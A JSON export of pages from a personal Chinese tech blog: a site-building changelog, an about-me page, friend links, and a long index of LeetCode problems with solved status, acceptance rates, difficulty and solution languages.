{"meta":{"title":"细语呢喃","subtitle":"技术改变生活","description":"一个分享机器学习、算法与数据结构，个人学习心得、读书笔记、生活的博客。","author":"hrwhisper","url":"https://www.hrwhisper.me","root":"/"},"pages":[{"title":"Blog建设","date":"2015-11-13T07:44:13.000Z","updated":"2020-11-07T09:06:06.118Z","comments":true,"path":"blog-building/index.html","permalink":"https://www.hrwhisper.me/blog-building/index.html","excerpt":"","text":"本博客使用 wordpress dazzling 主题 插件见: wordpress 一些推荐的插件 VPS:现在用Vultr 强力推荐新加坡结点~稳定快速 点击上面的链接注册可以获得10刀 原来用的digitalocean 建站经验 LNMP站点配置指南 Let’s Encrypt！ Centos 获取https证书攻略 本博客 SEO实战记录 wordpress 博客全站开启https 百度分享不支持https的解决方案 apache 在低配置服务器下的优化 更多建站经验查看分类目录： 建站经验 更新日志 2020.10 迁移到hexo 2018.10 接入google adsense广告 2017.7 blog 文章目录 升级服务器nginx / mysql / php版本 2016.12.14 添加latex支持 2016.08.16 上线打赏模块 2016.07.14 弃用LAMP转向LNMP 2016.01.22 使得百度分享支持https 2016.01.19 评论回复邮件提醒和异步评论 2016.01.17 全站开启https 不再使用多说插件 2015.12.20 正式迁移到digitalocean VPS 2015.12.18 修改正文样式，字体更美观，删掉无用CSS 2015.12.3 修正手机阅读文章侧边栏打开后正文宽度变小Bug blog 底部导航样式修改 2015.11.29 更新一些不规范写法，使得blog通过W3C认证 2015.11.25 社交网站如微博、twitter 地址加上noFollow 属性 所有博文自动版权链接 301 重定向 原 archives 固定链接 2015.11.12 迁移至独立IP主机 F12 console增加彩蛋 2015.11.10 blog 底部增加 知乎 和 twitter 链接 ，并修复和图标在不同浏览器大小下错位bug 修复导航控件 在手机端 被Crayon 遮挡 bug 2015.11.3 加入百度分享 2015.5.10 侧边栏加入微博 2015.5.9 文章改为显示到正文标签read more 前，更能体现文章内容 修改weibo图标不显示bug 去除首页一开始的画廊展示，更加简洁 修复搜索页continue reading 在左边的问题 将搜索页、文章归档页和主页宽度调为一致 2015.5.4 修复wp-player css冲突 把日期页导航改为和主页一致 2015.4.25 更换blog主题 修复新主题wp-postview不显示问题 2015.4.8 修改正文字体为Georgia,microsoft yahei,serif 修改&lt;hr&gt;标签样式 修改正文line-height为1.5 修改文章首字大小 2015.3.29 修改Blog css为markdown样式 修改各级标题 修改文字 修改引用样式 修改连接颜色 设置七牛CDN不再缓存css（每次更改要等老半天） 2015.3.26 将站点迁移至衡天主机 2015.2.8 修复不能发送邮件bug 允许新用户注册 2014.11.30 抛弃CSDN博客，本blog正式上线"},{"title":"关于...","date":"2015-04-25T12:05:07.000Z","updated":"2020-11-10T14:46:28.542Z","comments":true,"path":"about-me/index.html","permalink":"https://www.hrwhisper.me/about-me/index.html","excerpt":"","text":"关于我 1994年5月出生，目前在baidu apollo打杂，曾经在微软MSRA、三星研究院实习搬砖。 UCAS 硕士一枚，FZU CS本科生，大三在RUC交流。 喜欢简洁而优雅的风格，生活也要简洁而优雅。 爱看书、爱跑步、爱摄影。 伪球迷一个，喜欢巴萨，最想去的球场是诺坎普。 有一个很可爱的女朋友，Love code, Love life, Love bella ! 关于hrwhisper.me hr是名字缩写 whipser是比较喜欢的单词 新主题提供极致的舒爽阅读体验 推荐使用markdown 学的速度永远比写博客速度慢很多。。。。 联系方式社交媒体 Email: hrwhisper [AT] qq (dot) com Blog: https://www.hrwhisper.me 其他SNS 见网页右侧 网易云音乐ID: hrwhisper 求互粉推荐好歌^ ^"},{"title":"categories","date":"2020-11-07T09:01:58.159Z","updated":"2020-11-07T09:01:58.159Z","comments":false,"path":"categories/index.html","permalink":"https://www.hrwhisper.me/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-07T09:04:20.948Z","updated":"2020-11-07T09:04:20.948Z","comments":false,"path":"tags/index.html","permalink":"https://www.hrwhisper.me/tags/index.html","excerpt":"","text":""},{"title":"小伙伴们","date":"2017-04-08T22:46:14.000Z","updated":"2021-05-24T14:40:07.367Z","comments":true,"path":"friend-link/index.html","permalink":"https://www.hrwhisper.me/friend-link/index.html","excerpt":"","text":"小伙伴们（排名不分先后） Arabelatso Knight's Blog 永不冷场的人生、 栖迟於一丘 Allianzcortex 雄雄的blog B1uew01f 暮光博客 Findspace 冰翼博客 最美时刻 azalea says Frytea’s Blog ZHOU Bin libinx 已经打不开的小伙伴 飞弦的博客专栏 Steven`s Notes 要成为小伙伴？ 只要你： 踏踏实实写博客，博客内容绝大部分原创，内容有价值 博客内容以互联网、技术类、生活类为主的，或各种混杂的。 网站服务器运行稳定，可以正常访问 留言即可=v="},{"title":"Leetcode 算法题解","date":"2015-12-18T14:57:44.000Z","updated":"2021-01-24T13:58:15.464Z","comments":true,"path":"leetcode-algorithm-solution/index.html","permalink":"https://www.hrwhisper.me/leetcode-algorithm-solution/index.html","excerpt":"","text":"本页面是博主leetcode题解集合(无锁的) 最左侧是题AC的情况，打勾的表示已经AC(很久没刷题，又落后了) 目前题解数:328, 可做总数: 601 (题目总数: 734 有锁题数: 133) Title栏目下有链接的就是已经发题解的了,有的题没有写题解，有空的时候补上。 如果要哪一个我还没发的 leetcode题解报告 ，可以留言，博主抽空就写。 有任何疑问欢迎留言^ ^ 博主尽快回复 由于博客从wordpress转到了hexo，可能存在部分c++代码中运算符||消失的情况 欢迎指出错误、有更快、更省空间的算法 使用爬虫leetcode_script辅助更新本页面 下面是解题报告~： # Title Acceptance Difficulty Language √ 1202 Smallest String With Swaps 49.2% Medium Python √ 947 Most Stones Removed with Same Row or Column 61.1% Medium Python √ 819 Most Common Word 52.2% Easy C++ / Python √ 818 Race Car 23.7% Hard C++ / Python √ 817 Linked List Components 47.3% Medium C++ / Python √ 816 Ambiguous Coordinates 41.5% Medium C++ / Python 815 Bus Routes 31.1% Hard 814 Binary Tree Pruning 72.6% Medium 813 Largest Sum of Averages 38.0% Medium 812 Largest Triangle Area 52.4% Easy 811 Subdomain Visit Count 65.0% Easy 810 Chalkboard XOR Game 36.0% Hard 809 Expressive Words 35.4% Medium 808 Soup Servings 31.4% Medium √ 807 Max Increase to Keep City Skyline 82.1% Medium √ 806 Number of Lines To Write String 64.6% Easy 805 Split Array With Same Average 20.1% Hard √ 804 Unique Morse Code Words 76.3% Easy √ 803 Bricks Falling When Hit 20.8% Hard Python √ 802 Find Eventual Safe States 35.9% Medium √ 801 Minimum Swaps To Make Sequences Increasing 23.9% Medium √ 800 Similar RGB Color 53.5% Easy √ 799 Champagne Tower 29.0% Medium C++ / Python √ 798 Smallest Rotation with Highest Score 31.5% Hard C++ / Python √ 797 All Paths From Source to Target 69.1% Medium Python √ 796 Rotate String 54.4% Easy C++ / Python 795 Number of Subarrays with Bounded Maximum 40.6% Medium 794 Valid Tic-Tac-Toe State 27.6% Medium 793 Preimage Size of Factorial Zeroes Function 44.6% Hard 792 Number of Matching Subsequences 35.3% Medium 791 Custom Sort String 60.1% Medium 790 Domino and Tromino Tiling 32.2% Medium 789 Escape The Ghosts 48.2% Medium 788 Rotated Digits 50.5% Easy 787 Cheapest Flights Within K Stops 29.9% Medium 786 K-th Smallest Prime Fraction 30.0% Hard 785 Is Graph Bipartite? 38.9% Medium 784 Letter Case Permutation 52.4% Easy 783 Minimum Distance Between BST Nodes 47.3% Easy 782 Transform to Chessboard 35.8% Hard 781 Rabbits in Forest 49.4% Medium 780 Reaching Points 22.3% Hard 779 K-th Symbol in Grammar 36.1% Medium 778 Swim in Rising Water 44.4% Hard 777 Swap Adjacent in LR String 27.8% Medium 775 Global and Local Inversions 31.7% Medium 773 Sliding Puzzle 47.6% Hard 771 Jewels and Stones 82.1% Easy 770 Basic Calculator IV 43.2% Hard 769 Max Chunks To Make Sorted 47.8% Medium 768 Max Chunks To Make Sorted II 42.9% Hard 767 Reorganize String 35.6% Medium 766 Toeplitz Matrix 57.7% Easy 765 Couples Holding Hands 48.3% Hard 764 Largest Plus Sign 37.4% Medium 763 Partition Labels 64.2% Medium 762 Prime Number of Set Bits in Binary Representation 55.0% Easy 761 Special Binary String 41.6% Hard 757 Set Intersection Size At Least Two 34.8% Hard 756 Pyramid Transition Matrix 45.8% Medium 754 Reach a Number 26.6% Medium 753 Cracking the Safe 39.8% Hard 752 Open the Lock 38.6% Medium 749 Contain Virus 39.7% Hard 748 Shortest Completing Word 51.9% Medium 747 Largest Number At Least Twice of Others 41.8% Easy 746 Min Cost Climbing Stairs 43.3% Easy 745 Prefix and Suffix Search 25.4% Hard 744 Find Smallest Letter Greater Than Target 44.0% Easy 743 Network Delay Time 35.1% Medium 741 Cherry Pickup 23.7% Hard 740 Delete and Earn 43.9% Medium 739 Daily Temperatures 52.5% Medium 738 Monotone Increasing Digits 40.8% Medium 736 Parse Lisp Expression 43.0% Hard 735 Asteroid Collision 37.0% Medium 733 Flood Fill 47.9% Easy 732 My Calendar III 50.9% Hard 731 My Calendar II 37.6% Medium 730 Count Different Palindromic Subsequences 35.1% Hard √ 729 My Calendar I 42.4% Medium 728 Self Dividing Numbers 66.7% Easy 726 Number of Atoms 43.8% Hard 725 Split Linked List in Parts 47.3% Medium 724 Find Pivot Index 39.4% Easy 722 Remove Comments 27.9% Medium 721 Accounts Merge 32.9% Medium 720 Longest Word in Dictionary 41.4% Easy √ 719 Find K-th Smallest Pair Distance 27.0% Hard √ 718 Maximum Length of Repeated Subarray 41.5% Medium Java / Python √ 717 1-bit and 2-bit Characters 49.5% Easy C++ √ 715 Range Module 31.2% Hard √ 714 Best Time to Buy and Sell Stock with Transaction Fee 45.5% Medium C++ / Java / Python √ 713 Subarray Product Less Than K 33.2% Medium C++ / Java / Python √ 712 Minimum ASCII Delete Sum for Two Strings 51.3% Medium C++ / Java / Python √ 699 Falling Squares 37.3% Hard C++ / Python √ 698 Partition to K Equal Sum Subsets 37.8% Medium Java √ 697 Degree of an Array 46.6% Easy Python √ 696 Count Binary Substrings 50.8% Easy Python √ 695 Max Area of Island 51.8% Easy Python √ 694 Number of Distinct Islands 45.2% Medium √ 693 Binary Number with Alternating Bits 55.7% Easy Python √ 692 Top K Frequent Words 41.3% Medium √ 691 Stickers to Spell Word 34.8% Hard Python √ 690 Employee Importance 51.6% Easy √ 689 Maximum Sum of 3 Non-Overlapping Subarrays 41.0% Hard Python √ 688 Knight Probability in Chessboard 40.0% Medium Python √ 687 Longest Univalue Path 32.9% Easy Python √ 686 Repeated String Match 32.2% Easy Python √ 685 Redundant Connection II 27.9% Hard √ 684 Redundant Connection 43.7% Medium √ 683 K Empty Slots 34.4% Hard √ 682 Baseball Game 58.0% Easy √ 681 Next Closest Time 42.0% Medium √ 680 Valid Palindrome II 32.2% Easy √ 679 24 Game 38.7% Hard √ 678 Valid Parenthesis String 29.5% Medium √ 677 Map Sum Pairs 51.6% Medium √ 676 Implement Magic Dictionary 49.1% Medium √ 675 Cut Off Trees for Golf Event 27.0% Hard √ 674 Longest Continuous Increasing Subsequence 42.4% Easy √ 673 Number of Longest Increasing Subsequence 31.6% Medium √ 672 Bulb Switcher II 49.5% Medium √ 671 Second Minimum Node In a Binary Tree 41.8% Easy √ 670 Maximum Swap 38.6% Medium √ 669 Trim a Binary Search Tree 58.0% Easy √ 668 Kth Smallest Number in Multiplication Table 40.1% Hard √ 667 Beautiful Arrangement II 51.4% Medium √ 665 Non-decreasing Array 20.3% Easy √ 664 Strange Printer 34.1% Hard √ 663 Equal Tree Partition 36.7% Medium √ 662 Maximum Width of Binary Tree 38.1% Medium √ 661 Image Smoother 46.0% Easy √ 660 Remove 9 49.5% Hard √ 659 Split Array into Consecutive Subsequences 37.0% Medium √ 658 Find K Closest Elements 35.0% Medium √ 657 Judge Route Circle 68.5% Easy √ 655 Print Binary Tree 49.2% Medium √ 654 Maximum Binary Tree 69.9% Medium √ 653 Two Sum IV – Input is a BST 50.0% Easy √ 652 Find Duplicate Subtrees 36.8% Medium √ 650 2 Keys Keyboard 44.9% Medium √ 649 Dota2 Senate 36.7% Medium √ 648 Replace Words 47.8% Medium √ 647 Palindromic Substrings 54.7% Medium √ 646 Maximum Length of Pair Chain 47.2% Medium √ 645 Set Mismatch 39.6% Easy √ 643 Maximum Average Subarray I 37.5% Easy √ 640 Solve the Equation 38.6% Medium √ 639 Decode Ways II 24.4% Hard √ 638 Shopping Offers 45.1% Medium √ 637 Average of Levels in Binary Tree 55.8% Easy √ 636 Exclusive Time of Functions 44.6% Medium √ 633 Sum of Square Numbers 32.3% Easy √ 632 Smallest Range 41.9% Hard √ 630 Course Schedule III 29.4% Hard √ 629 K Inverse Pairs Array 27.3% Hard √ 628 Maximum Product of Three Numbers 44.6% Easy √ 623 Add One Row to Tree 46.2% Medium √ 621 Task Scheduler 42.4% Medium √ 617 Merge Two Binary Trees 67.5% Easy √ 611 Valid Triangle Number 42.1% Medium √ 609 Find Duplicate File in System 52.2% Medium √ 606 Construct String from Binary Tree 49.7% Easy √ 605 Can Place Flowers 30.1% Easy √ 600 Non-negative Integers without Consecutive Ones 31.7% Hard √ 599 Minimum Index Sum of Two Lists 46.4% Easy √ 598 Range Addition II 48.1% Easy √ 594 Longest Harmonious Subsequence 41.1% Easy √ 593 Valid Square 39.9% Medium √ 592 Fraction Addition and Subtraction 46.0% Medium √ 591 Tag Validator 31.0% Hard √ 587 Erect the Fence 33.7% Hard √ 583 Delete Operation for Two Strings 44.5% Medium √ 582 Kill Process 50.8% Medium √ 581 Shortest Unsorted Continuous Subarray 29.1% Easy √ 576 Out of Boundary Paths 30.6% Medium √ 575 Distribute Candies 58.0% Easy √ 572 Subtree of Another Tree 40.2% Easy √ 567 Permutation in String 36.3% Medium √ 566 Reshape the Matrix 57.6% Easy √ 565 Array Nesting 49.3% Medium √ 564 Find the Closest Palindrome 17.2% Hard √ 563 Binary Tree Tilt 47.2% Easy √ 561 Array Partition I 66.3% Easy √ 560 Subarray Sum Equals K 39.9% Medium √ 557 Reverse Words in a String III 60.0% Easy √ 556 Next Greater Element III 29.0% Medium √ 554 Brick Wall 46.5% Medium √ 553 Optimal Division 55.2% Medium √ 552 Student Attendance Record II 31.6% Hard √ 551 Student Attendance Record I 44.6% Easy √ 547 Number of Provinces 49.1% Medium Python √ 546 Remove Boxes 35.4% Hard √ 544 Output Contest Matches 71.4% Medium √ 543 Diameter of Binary Tree 44.9% Easy Python √ 542 01 Matrix 33.0% Medium Python √ 541 Reverse String II 43.9% Easy √ 540 Single Element in a Sorted Array 55.9% Medium √ 539 Minimum Time Difference 46.1% Medium √ 538 Convert BST to Greater Tree 48.7% Easy Python √ 537 Complex Number Multiplication 63.6% Medium √ 535 Encode and Decode TinyURL 73.8% Medium √ 532 K-diff Pairs in an Array 28.1% Easy √ 530 Minimum Absolute Difference in BST 47.4% Easy √ 529 Minesweeper 49.5% Medium √ 528 Random Pick with Weight 43.3% Medium √ 526 Beautiful Arrangement 53.2% Medium √ 525 Contiguous Array 41.4% Medium √ 524 Longest Word in Dictionary through Deleting 43.3% Medium √ 523 Continuous Subarray Sum 23.3% Medium √ 522 Longest Uncommon Subsequence II 32.0% Medium √ 521 Longest Uncommon Subsequence I 55.7% Easy √ 520 Detect Capital 51.9% Easy √ 517 Super Washing Machines 36.3% Hard √ 516 Longest Palindromic Subsequence 42.8% Medium √ 515 Find Largest Value in Each Tree Row 55.5% Medium √ 514 Freedom Trail 39.3% Hard √ 513 Find Bottom Left Tree Value 56.1% Medium √ 508 Most Frequent Subtree Sum 52.2% Medium √ 507 Perfect Number 32.5% Easy √ 506 Relative Ranks 46.9% Easy √ 504 Base 7 43.9% Easy √ 503 Next Greater Element II 48.1% Medium √ 502 IPO 36.4% Hard √ 501 Find Mode in Binary Search Tree 37.5% Easy √ 500 Keyboard Row 59.9% Easy √ 498 Diagonal Traverse 46.2% Medium √ 496 Next Greater Element I 56.5% Easy √ 495 Teemo Attacking 51.4% Medium √ 494 Target Sum 43.8% Medium √ 493 Reverse Pairs 20.8% Hard √ 492 Construct the Rectangle 48.0% Easy √ 491 Increasing Subsequences 38.8% Medium √ 488 Zuma Game 37.2% Hard √ 486 Predict the Winner 45.1% Medium √ 485 Max Consecutive Ones 53.8% Easy √ 483 Smallest Good Base 33.7% Hard √ 482 License Key Formatting 39.6% Easy √ 481 Magical String 45.8% Medium √ 480 Sliding Window Median 30.8% Hard √ 479 Largest Palindrome Product 25.6% Easy √ 477 Total Hamming Distance 47.5% Medium √ 476 Number Complement 61.1% Easy √ 475 Heaters 29.7% Easy √ 474 Ones and Zeroes 38.8% Medium √ 473 Matchsticks to Square 35.3% Medium √ 472 Concatenated Words 31.0% Hard √ 468 Validate IP Address 20.6% Medium √ 467 Unique Substrings in Wraparound String 33.2% Medium √ 466 Count The Repetitions 27.3% Hard √ 464 Can I Win 25.3% Medium √ 463 Island Perimeter 57.9% Easy √ 462 Minimum Moves to Equal Array Elements II 51.8% Medium √ 461 Hamming Distance 69.5% Easy √ 460 LFU Cache 25.1% Hard √ 459 Repeated Substring Pattern 38.2% Easy √ 456 132 Pattern 27.8% Medium √ 455 Assign Cookies 47.2% Easy √ 454 4Sum II 47.6% Medium √ 453 Minimum Moves to Equal Array Elements 48.0% Easy √ 452 Minimum Number of Arrows to Burst Balloons 44.5% Medium √ 451 Sort Characters By Frequency 51.7% Medium √ 450 Delete Node in a BST 37.8% Medium √ 449 Serialize and Deserialize BST 43.0% Medium C++ / Java / Python √ 448 Find All Numbers Disappeared in an Array 51.1% Easy √ 447 Number of Boomerangs 46.7% Easy √ 446 Arithmetic Slices II – Subsequence 28.0% Hard √ 445 Add Two Numbers II 46.2% Medium 443 String Compression 35.9% Easy √ 442 Find All Duplicates in an Array 57.0% Medium √ 441 Arranging Coins 36.5% Easy √ 440 K-th Smallest in Lexicographical Order 25.7% Hard √ 438 Find All Anagrams in a String 33.9% Easy √ 437 Path Sum III 40.2% Easy √ 436 Find Right Interval 41.5% Medium √ 435 Non-overlapping Intervals 41.2% Medium √ 434 Number of Segments in a String 36.6% Easy √ 432 All O`one Data Structure 28.0% Hard C++ / Java / Python √ 424 Longest Repeating Character Replacement 42.6% Medium √ 423 Reconstruct Original Digits from English 44.7% Medium √ 421 Maximum XOR of Two Numbers in an Array 48.0% Medium √ 420 Strong Password Checker 19.8% Hard √ 419 Battleships in a Board 63.1% Medium √ 417 Pacific Atlantic Water Flow 34.8% Medium √ 416 Partition Equal Subset Sum 38.9% Medium √ 415 Add Strings 41.8% Easy √ 414 Third Maximum Number 28.1% Easy √ 413 Arithmetic Slices 54.5% Medium √ 412 Fizz Buzz 58.1% Easy √ 410 Split Array Largest Sum 39.4% Hard √ 409 Longest Palindrome 46.0% Easy √ 407 Trapping Rain Water II 37.9% Hard √ 406 Queue Reconstruction by Height 56.5% Medium √ 405 Convert a Number to Hexadecimal 41.0% Easy √ 404 Sum of Left Leaves 47.5% Easy √ 403 Frog Jump 32.6% Hard Python √ 402 Remove K Digits 25.8% Medium Python √ 401 Binary Watch 44.8% Easy Python √ 400 Nth Digit 30.2% Easy Python √ 399 Evaluate Division 42.4% Medium Python √ 398 Random Pick Index 44.7% Medium Python √ 397 Integer Replacement 30.5% Medium Python √ 396 Rotate Function 33.8% Medium Python √ 395 Longest Substring with At Least K Repeating Characters 35.7% Medium C++ / Python √ 394 Decode String 42.1% Medium Python √ 393 UTF-8 Validation 34.8% Medium Python √ 392 Is Subsequence 44.7% Medium C++ / Java / Python √ 391 Perfect Rectangle 27.5% Hard Python √ 390 Elimination Game 42.6% Medium Python √ 389 Find the Difference 51.3% Easy Python √ 388 Longest Absolute File Path 37.5% Medium Python √ 387 First Unique Character in a String 47.1% Easy Python √ 386 Lexicographical Numbers 42.3% Medium Python √ 385 Mini Parser 30.9% Medium Python √ 384 Shuffle an Array 47.3% Medium C++ / Java / Python √ 383 Ransom Note 47.8% Easy C++ / Java / Python √ 382 Linked List Random Node 47.4% Medium C++ / Java / Python √ 381 Insert Delete GetRandom O(1) – Duplicates allowed 29.7% Hard C++ / Python √ 380 Insert Delete GetRandom O(1) 39.9% Medium Python √ 378 Kth Smallest Element in a Sorted Matrix 45.5% Medium C++ / Java / Python √ 377 Combination Sum IV 42.7% Medium C++ / Java / Python √ 376 Wiggle Subsequence 36.1% Medium C++ / Java / Python √ 375 Guess Number Higher or Lower II 36.1% Medium C++ / Java / Python √ 374 Guess Number Higher or Lower 36.7% Easy C++ / Java / Python √ 373 Find K Pairs with Smallest Sums 31.3% Medium C++ √ 372 Super Pow 34.8% Medium C++ / Java / Python √ 371 Sum of Two Integers 50.9% Easy C++ / Java / Python √ 368 Largest Divisible Subset 33.9% Medium C++ / Java / Python √ 367 Valid Perfect Square 38.7% Easy C++ / Java / Python √ 365 Water and Jug Problem 28.0% Medium C++ / Java / Python √ 363 Max Sum of Rectangle No Larger Than K 33.8% Hard C++ √ 357 Count Numbers with Unique Digits 46.1% Medium C++ / Java / Python √ 355 Design Twitter 25.8% Medium Python √ 354 Russian Doll Envelopes 32.6% Hard C++ / Python √ 352 Data Stream as Disjoint Intervals 41.1% Hard Java √ 350 Intersection of Two Arrays II 44.3% Easy Python √ 349 Intersection of Two Arrays 48.3% Easy C++ / Java / Python √ 347 Top K Frequent Elements 49.6% Medium C++ / Python √ 345 Reverse Vowels of a String 39.2% Easy C++ √ 344 Reverse String 60.4% Easy C++ / Python √ 343 Integer Break 46.5% Medium Python √ 342 Power of Four 39.2% Easy C++ / Java / Python √ 341 Flatten Nested List Iterator 43.2% Medium √ 338 Counting Bits 62.2% Medium C++ / Java / Python √ 337 House Robber III 44.7% Medium C++ / Java / Python √ 336 Palindrome Pairs 27.2% Hard Python √ 335 Self Crossing 26.2% Hard C++ / Java / Python √ 334 Increasing Triplet Subsequence 39.7% Medium C++ / Java / Python √ 332 Reconstruct Itinerary 29.9% Medium C++ / Python √ 331 Verify Preorder Serialization of a Binary Tree 37.1% Medium Java / Python √ 330 Patching Array 32.7% Hard C++ / Java / Python √ 329 Longest Increasing Path in a Matrix 37.5% Hard C++ / Java / Python √ 328 Odd Even Linked List 44.8% Medium C++ / Java / Python √ 327 Count of Range Sum 30.7% Hard C++ / Python √ 326 Power of Three 40.7% Easy C++ / Java / Python √ 324 Wiggle Sort II 26.4% Medium Java / Python √ 322 Coin Change 26.6% Medium C++ / Java / Python √ 321 Create Maximum Number 24.8% Hard C++ / Java / Python √ 319 Bulb Switcher 43.0% Medium C++ / Java / Python √ 318 Maximum Product of Word Lengths 45.7% Medium C++ / Java / Python √ 316 Remove Duplicate Letters 30.4% Hard Python √ 315 Count of Smaller Numbers After Self 35.0% Hard √ 313 Super Ugly Number 38.3% Medium C++ / Java / Python √ 312 Burst Balloons 43.7% Hard √ 310 Minimum Height Trees 29.0% Medium √ 309 Best Time to Buy and Sell Stock with Cooldown 42.0% Medium √ 307 Range Sum Query – Mutable 22.6% Medium √ 306 Additive Number 27.7% Medium √ 304 Range Sum Query 2D – Immutable 27.3% Medium √ 303 Range Sum Query – Immutable 32.2% Easy √ 301 Remove Invalid Parentheses 35.9% Hard √ 300 Longest Increasing Subsequence 38.9% Medium √ 299 Bulls and Cows 36.0% Medium √ 297 Serialize and Deserialize Binary Tree 35.1% Hard C++ / Java / Python √ 295 Find Median from Data Stream 29.6% Hard √ 292 Nim Game 55.4% Easy √ 290 Word Pattern 33.5% Easy √ 289 Game of Life 37.3% Medium √ 287 Find the Duplicate Number 44.3% Medium √ 284 Peeking Iterator 35.5% Medium √ 283 Move Zeroes 51.6% Easy √ 282 Expression Add Operators 30.6% Hard √ 279 Perfect Squares 37.8% Medium √ 278 First Bad Version 25.9% Easy √ 275 H-Index II 34.9% Medium Python √ 274 H-Index 33.7% Medium C++ / Python √ 273 Integer to English Words 22.8% Hard √ 268 Missing Number 45.1% Easy C++ / Python √ 264 Ugly Number II 33.3% Medium C++ / Java / Python √ 263 Ugly Number 39.7% Easy C++ / Java / Python √ 260 Single Number III 53.2% Medium √ 258 Add Digits 51.8% Easy C++ / Python √ 257 Binary Tree Paths 41.3% Easy √ 242 Valid Anagram 47.5% Easy √ 241 Different Ways to Add Parentheses 46.1% Medium √ 240 Search a 2D Matrix II 39.1% Medium C++ / Java / Python √ 239 Sliding Window Maximum 34.2% Hard √ 238 Product of Array Except Self 50.3% Medium C++ / Java / Python √ 237 Delete Node in a Linked List 47.2% Easy √ 236 Lowest Common Ancestor of a Binary Tree 29.9% Medium Python √ 235 Lowest Common Ancestor of a Binary Search Tree 39.8% Easy Python √ 234 Palindrome Linked List 33.5% Easy √ 233 Number of Digit One 29.0% Hard √ 232 Implement Queue using Stacks 38.1% Easy √ 231 Power of Two 40.8% Easy √ 230 Kth Smallest Element in a BST 45.3% Medium √ 229 Majority Element II 29.2% Medium √ 228 Summary Ranges 32.1% Medium C++ √ 227 Basic Calculator II 30.1% Medium √ 226 Invert Binary Tree 53.3% Easy √ 225 Implement Stack using Queues 34.4% Easy √ 224 Basic Calculator 28.7% Hard √ 223 Rectangle Area 33.8% Medium √ 222 Count Complete Tree Nodes 27.7% Medium √ 221 Maximal Square 30.4% Medium √ 220 Contains Duplicate III 18.8% Medium C++ / Java / Python √ 219 Contains Duplicate II 32.9% Easy C++ / Java / Python √ 218 The Skyline Problem 29.1% Hard √ 217 Contains Duplicate 47.1% Easy C++ / Java / Python √ 216 Combination Sum III 47.3% Medium √ 215 Kth Largest Element in an Array 40.6% Medium √ 214 Shortest Palindrome 25.2% Hard √ 213 House Robber II 34.6% Medium √ 212 Word Search II 24.8% Hard √ 211 Add and Search Word – Data structure design 25.4% Medium √ 210 Course Schedule II 30.3% Medium √ 209 Minimum Size Subarray Sum 32.1% Medium C++ / Java / Python √ 208 Implement Trie (Prefix Tree) 31.0% Medium √ 207 Course Schedule 33.8% Medium √ 206 Reverse Linked List 46.8% Easy √ 205 Isomorphic Strings 34.8% Easy √ 204 Count Primes 26.5% Easy C++ / Java / Python √ 203 Remove Linked List Elements 33.5% Easy √ 202 Happy Number 41.6% Easy √ 201 Bitwise AND of Numbers Range 34.5% Medium √ 200 Number of Islands 36.6% Medium √ 199 Binary Tree Right Side View 42.5% Medium √ 198 House Robber 40.0% Easy √ 191 Number of 1 Bits 40.4% Easy √ 190 Reverse Bits 29.4% Easy √ 189 Rotate Array 25.3% Easy √ 188 Best Time to Buy and Sell Stock IV 24.9% Hard √ 187 Repeated DNA Sequences 33.1% Medium √ 179 Largest Number 23.5% Medium C++ / Java / Python √ 174 Dungeon Game 24.2% Hard √ 173 Binary Search Tree Iterator 43.6% Medium √ 172 Factorial Trailing Zeroes 37.0% Easy √ 171 Excel Sheet Column Number 48.5% Easy √ 169 Majority Element 48.0% Easy √ 168 Excel Sheet Column Title 27.3% Easy √ 167 Two Sum II – Input array is sorted 47.2% Easy C++ / Java / Python √ 166 Fraction to Recurring Decimal 18.1% Medium √ 165 Compare Version Numbers 20.8% Medium √ 164 Maximum Gap 30.1% Hard √ 162 Find Peak Element 38.9% Medium √ 160 Intersection of Two Linked Lists 30.9% Easy C / C++ / Java / Python √ 155 Min Stack 31.3% Easy C++ / Python √ 154 Find Minimum in Rotated Sorted Array II 37.9% Hard √ 153 Find Minimum in Rotated Sorted Array 40.9% Medium √ 152 Maximum Product Subarray 26.8% Medium √ 151 Reverse Words in a String 15.6% Medium √ 150 Evaluate Reverse Polish Notation 28.5% Medium √ 149 Max Points on a Line 15.2% Hard √ 148 Sort List 29.9% Medium √ 147 Insertion Sort List 33.9% Medium √ 146 LRU Cache 19.9% Hard √ 145 Binary Tree Postorder Traversal 42.3% Hard C++ / Python √ 144 Binary Tree Preorder Traversal 46.9% Medium C++ / Python √ 143 Reorder List 26.8% Medium C++ / Python √ 142 Linked List Cycle II 30.6% Medium C++ / Java / Python √ 141 Linked List Cycle 35.0% Easy C / C++ / Java / Python √ 140 Word Break II 24.6% Hard √ 139 Word Break 31.5% Medium √ 138 Copy List with Random Pointer 25.8% Medium C++ / Python √ 137 Single Number II 42.7% Medium √ 136 Single Number 55.4% Easy √ 135 Candy 25.3% Hard C++ / Python √ 134 Gas Station 30.0% Medium C++ / Python √ 133 Clone Graph 25.2% Medium √ 132 Palindrome Partitioning II 24.9% Hard C++ / Java / Python √ 131 Palindrome Partitioning 35.7% Medium C++ / Python √ 130 Surrounded Regions 19.7% Medium C++ / Python √ 129 Sum Root to Leaf Numbers 37.8% Medium √ 128 Longest Consecutive Sequence 38.3% Hard √ 127 Word Ladder 20.1% Medium √ 126 Word Ladder II 14.9% Hard √ 125 Valid Palindrome 27.0% Easy √ 124 Binary Tree Maximum Path Sum 27.2% Hard √ 123 Best Time to Buy and Sell Stock III 30.4% Hard √ 122 Best Time to Buy and Sell Stock II 47.7% Easy √ 121 Best Time to Buy and Sell Stock 42.9% Easy √ 120 Triangle 34.9% Medium C++ / Python √ 119 Pascal’s Triangle II 38.2% Easy C++ / Python √ 118 Pascal’s Triangle 40.1% Easy C++ / Python √ 117 Populating Next Right Pointers in Each Node II 33.9% Medium √ 116 Populating Next Right Pointers in Each Node 36.8% Medium √ 115 Distinct Subsequences 32.1% Hard C++ / Python √ 114 Flatten Binary Tree to Linked List 36.6% Medium C++ / Python √ 113 Path Sum II 35.7% Medium C++ / Python √ 112 Path Sum 35.0% Easy √ 111 Minimum Depth of Binary Tree 33.6% Easy √ 110 Balanced Binary Tree 38.5% Easy C++ / Python √ 109 Convert Sorted List to Binary Search Tree 35.8% Medium C++ / Java / Python √ 108 Convert Sorted Array to Binary Search Tree 44.6% Easy C++ / Java / Python √ 107 Binary Tree Level Order Traversal II 42.2% Easy C++ / Python √ 106 Construct Binary Tree from Inorder and Postorder Traversal 33.7% Medium √ 105 Construct Binary Tree from Preorder and Inorder Traversal 34.2% Medium √ 104 Maximum Depth of Binary Tree 55.0% Easy C++ / Python √ 103 Binary Tree Zigzag Level Order Traversal 36.8% Medium 